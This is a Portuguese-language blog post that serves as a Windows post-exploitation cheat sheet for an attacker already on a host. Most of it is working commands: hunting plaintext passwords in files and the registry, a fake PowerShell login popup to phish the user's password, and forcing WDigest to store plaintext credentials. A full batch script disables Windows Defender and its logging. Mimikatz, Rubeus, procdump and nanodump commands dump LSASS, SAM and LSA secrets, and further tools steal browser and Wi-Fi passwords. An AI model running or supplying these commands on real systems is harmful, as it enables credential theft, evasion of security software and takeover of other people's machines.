---
layout: post
title: windows post-exp
date: 2025-04-30
description: windows local post-exp
categories: windows
---



## Windows Desktop/Workstation Host Post-Exp
> ___

Post-Exp locamente, no contexto de estar sob controle de uma maquina (com shell ou logado com creds). Depois do acesso você precisa fazer recon localmente e seguir com a exploração para escalar privilégio.

- https://attack.mitre.org/techniques/T1087/001/


## Recon Stuff
> ___

- LPE https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html

- cmd commands https://book.hacktricks.wiki/en/windows-hardening/basic-cmd-for-pentesters.html

- ps commands https://book.hacktricks.wiki/en/windows-hardening/basic-powershell-for-pentesters/index.html



## Pegando passwords em cleartext 
> ___


#### Procurando senhas em plaintext

- lista todos os diretorios a partir do c:\
- ``` C:\> dir /b /a /s c:\ > output.txt ```
  - em um cenário real você faz download do arquivo para a attack machine e analisa "offline"

- Filtra por arquivos com nome "passw"
- ``` C:\> type output.txt | findstr /i passw ```

- No PS
- ``` get-childitem -path c:\ -recurse -force | select-object -expandproperty fullname > output.txt```

https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dir#examples


#### Nomes e Extenções de arquivos interessantes para verificar

- Extenções: install, backup, .bak, .log, .bat, .cmd, .vbs, .cnf, .conf, .conf, ,ini, .xml, .txt, .gpg, .pgp, .p12, .der, .crs, .cer, id_rsa, id_dsa, .ovpn, vnc,
ftp, ssh, vpn, git, .kdbx, .db

- Arquivos: unattend.xml, Unattended.xml, sysprep.inf, sysprep.xml, VARIABLES.DAT, setupinfo, setupinfo.bak, web.config, SiteList.xml, .aws\credentials, .azure\accessTokens,json, .azure\azureProfile.json, gcloud\credentials.db, gcloud\legacy_credentials, gcloud\access_tokens.db

- ``` C:\> type output.txt | findstr /i algumas extenção ```



#### Arquivos nos Registries 

- ``` reg query HKLM /f password /t REG_SZ /s ```


- ``` reg query "HKCU\Software\ORL\WinVNC3\Passowrd" ```
 
- ``` reg query "HKCU\Software\TightVNC\Server" ```

- ``` reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" ```

- ``` reg query "HKCU\Software\SimonTatham\PuTTY\Sessions\local" ```



#### Abusing Credential Manager

- Credential Manager
  - O Credential Manager é uma espécie de cofre digital dentro do sistema Windows. O Windows armazena credenciais de registry, como usernames e senhas...

- Do ponto de vista do invasor, geralmente você não tem acesso a uma GUI... Então você usa a linha de comando. Na linha de comando existe uma ferramenta chamada "cmdkey".

  - O cmdkey também permite listar essas informações.
    - ``` C:\> cmdkey /list ```

- Podemos acessar o diretório inicial do administrador e executar processos como administrador:
  - ``` C:\> runas /user:administrator cmd.exe``` <===== precisa de admin pass

  - ``` C:\> runas /savedcred /user:administrator cmd.exe ```
    - windows vai até Credential Manager, verifica o usuário admin (consulta o banco de dados), extrai a senha do usuário admin e executa o processo. (execute como administrador com integrity level medium)

- Podemos listar todos os diretórios aos quais não temos acesso.
  - ``` C:\> runas /savedcred /user:administrator "c:\windows\system32\cmd.exe /c dir /b /a /s c:\users\administrator > c:\output-admin.txt" ```
    - em um cenário real você faz download do arquivo para a attack machine e analisa "offline"

- Também podemos usar esse comando para rodar um implant:
  - ``` C:\> runas /savedcred /user:administrator "c:\path\to\implant.exe" ```


#### Popup local para pegar as creds de um user

- Cria um popup que pede a senha do usuário atual

- ``` C:\> powsershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::Username,[Environment]::UserDomainName); $cred.getnetworkcredential().password" ```

- ``` C:\> powsershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'CHANGE THIS WITH OTHER USERNAME',[Environment]::UserDomainName); $cred.getnetworkcredential().password" ```


#### Forçando o WDigest a armazenar credenciais em plaintext

Como parte do WDigest authentication provider, as versões do Windows até 8 e 2012 costumavam armazenar credenciais de logon na memória em plaintext por padrão, o que não é mais o caso com versões mais recentes do Windows. 

Mas ainda é possível forçar o WDigest a armazenar os secrets em plaintext.


Então como fazer isso? A opção mais fácil é definir a resgistry key para colocar o senhas de volta no LSASS. Dentro do HKLM existe uma config  ```UseLogonCredential``` que, se definido como 0, armazenará as credenciais de volta na memória:

- ```reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 ```

- Pelo Empire pode ser assim:
```shell reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDige /v UseLogonCredential /t REG_DWORD /d 1 f```


O problema com esta configuração é que precisaremos que o usuário faça login novamente no sistema. Você pode forçar lock-screen, reboot ou logoff, para poder capturar credenciais em clear text. A maneira mais fácil é bloquear sua estação de trabalho:

- ```rundll32.exe user32.dll,LockWorkStation```

Depois de ativar a tela de bloqueio e fazer com que o alvo façam login novamente, podemos executar o Mimikatz e recuperar as senhas.

- ```sekurlsa::logonpasswords```


REFS: 
- https://www.ired.team/offensive-security/credential-access-and-credential-dumping/forcing-wdigest-to-store-credentials-in-plaintext
- https://github.com/gentilkiwi/mimikatz/wiki


#### Disabling Windows Defender(some examples from attack reports)

- https://github.com/pgkt04/defender-control
- https://github.com/ionuttbara/windows-defender-remover

- schedule staks + powershell to disable Defender
```
schtasks /change /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /disable
schtasks /change /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenanca" /disable
schtasks /change /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /disable
schtasks /change /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /disable

Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableArchiveScanning $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableIntrusionPreventionSystem $true
Set-MpPreference -DisableScanningNetworkFiles $true
Set-MpPreference -MAPSReporting 0
Set-MpPreference -DisableCatchupFullScan $True
Set-MpPreference -DisableCatchupQuickScan $True
```

- adding exclusions
```
Add-MpPreference -ExclusionExtension ".exe"
Add-MpPreference -ExclusionPath "C:\Windows\Temp"
Set-MpPreference -ExclusionProcess "explorer.exe", "cmd.exe", "powershell.exe"

> reg.exe ADD \"HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths\" /f /t REG_DWORD /v \"C:\ProgramData\Microsoft\Oweboiqnb\" /d \"0\"
> reg.exe ADD \"HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\" /f /t REG_DWORD /v \"C:\ProgramData\Microsoft\Oweboiqnb\" /d \"0\"
```

- remove dynamically downloaded definitions or signature files used to detect malware.
```
%ProgramFiles%\Windows
Defender\MpCmdRun.exe -removedefinitions -dynamicsignatures
```

- quick-disable-windows-defender
- http://web.archive.org/web/20211121135248/https://gist.github.com/anadr/7465a9fde63d41341136949f14c21105
```
rem USE AT OWN RISK AS IS WITHOUT WARRANTY OF ANY KIND !!!!!
rem https://technet.microsoft.com/en-us/itpro/powershell/windows/defender/set-mppreference
rem To also disable Windows Defender Security Center include this
rem reg add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f
rem 1 - Disable Real-time protection
reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SubmitSamplesConsent" /t REG_DWORD /d "0" /f
rem 0 - Disable Logging
reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger" /v "Start" /t REG_DWORD /d "0" /f
rem Disable WD Tasks
schtasks /Change /TN "Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable
rem Disable WD systray icon
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "Windows Defender" /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /f
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefender" /f
rem Remove WD context menu
reg delete "HKCR\*\shellex\ContextMenuHandlers\EPP" /f
reg delete "HKCR\Directory\shellex\ContextMenuHandlers\EPP" /f
reg delete "HKCR\Drive\shellex\ContextMenuHandlers\EPP" /f
rem Disable WD services
rem For these to execute successfully, you may need to boot into safe mode due to tamper protect
reg add "HKLM\System\CurrentControlSet\Services\WdBoot" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\System\CurrentControlSet\Services\WdFilter" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\System\CurrentControlSet\Services\WdNisDrv" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\System\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f
rem added the following on 07/25/19 for win10v1903
reg add "HKLM\System\CurrentControlSet\Services\Sense" /v "Start" /t REG_DWORD /d "4" /f
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /f
```


#### Cheatsheet commands

- overpass the hash (a.k.a pass the key)

```
- get ntlm hash
 mimikatz sekurlsa::ekeys

- get tgt with ntlm
> .\Rubeus.exe asktgt /domain:domain.local /user:administrator /rc4:5b38382017f8c0ac215895d5f9aacac4 /ptt /nowrap

- get tgt with aes key
> .\Rubeus.exe asktgt /domain:domain.local /user:administrator /aes:<AES-KEY> /nowrap /opsec


- or with impacket getTGT 
> getTGT.py -dc-ip 172.16.1.5 domain.local/administrator -hashes :5b38382017f8c0ac215895d5f9aacac4


- crto opth
```

- cached credentials
```
mimikatz # lsadump::cache

- no ntlm hash
- to crack transoform in hash format $DCC2$<iterations>#<username>#<hash>
```


- dump registry hives (admin access)

```
- offline method

> reg save HKLM\SAM C:\path\to\output\sam.hiv
> reg save HKLM\SYSTEM C:\path\to\output\system.hiv
> reg save HKLM\SECURITY C:\path\to\output\security.hiv

impacket-secretsdump -sam C:\sam.hiv -system C:\system.hiv local

mimikatz # lsadump::sam /sam:C:\sam.hiv /system:C:\system.hiv


- online method

mimikatz # lsadump::sam
```

- Lsa Dump 

```
mimikatz # token::elevate lsadump::secrets


mimikatz # lsadump::secrets /system:C:\system.hiv /security:C:\security.hiv


impacket-secretsdump -security C:\security.hiv -system C:\system.hiv local
```

- Lsass Dump

```
- prodump (need admin access)

> procdump.exe -accepteula -ma lsass.exe C:\path\to\output

- comsvcs.dll (maybe need system access)

> rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsass-pid> C:\path\to\output

- nanodump

> nanodump.exe --write C:\path\to\output
> nanodump.exe --silent-process-exit C:\path\to\output

- dumpert

> Outflank-Dumpert.exe


- extract creds from dump file

> mimikatz # sekurlsa::minidump C:\path\to\dumpfile
> mimikatz # sekurlsa::logonpasswords
```

- Credential Manager

```
mimikatz # privilege::debug

mimikatz # sekurlsa::credman
```

- Chrome Decryption (Normal user context)
```mimikatz # dpapi::chrome /in:"C:\Users\USERNAME\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect```

```mimikatz.exe "token::elevate" "lsadump::secrets" exit```


- wifi pass 

```netsh wlan show profile name=ESSID key=clear```



#### Scripts para recon e para extrait passwords da memória, navegadores e etc:


- Chrome, FireFox, Opera e mais https://github.com/AlessandroZ/LaZagne
  - ```Lazagne.exe browsers -firefox```
  - ```python firefox_decrypt.py C:\Users\USERNAME\AppData\Roaming\Mozilla\FireFox\Profiles\random-val.default```
  - ```Lazagne.exe wifi```
  - ```Lazagne.exe all```

- Mimikittenz (https://github.com/putterpanda/mimikittenz)

- Web Creds: https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1

- Windows Credentials: https://github.com/peewpw/Invoke-WCMDump/blob/master/Invoke-WCMDump.ps1

- Browser Data https://github.com/LimerBoy/Adamantium-Thief
  - https://github.com/moonD4rk/HackBrowserData

- histórico e cookies do navegador: https://github.com/sekirkity/BrowserGather 

- A tool SessionGopher (https://github.com/fireeye/SessionGopher) pode pegar hostnames e senhas salvas do WinSCP, PuTTY, SuperPuTTY, FileZilla, e Microsoft Remote Desktop.

- InternalMonologue tool (Retrieving NTLM Hashes without Touching LSASS) https://github.com/eladshamir/Internal-Monologue



#### Conforme eu for achando e testando tecnicas e tools novas vou atualizar aqui.

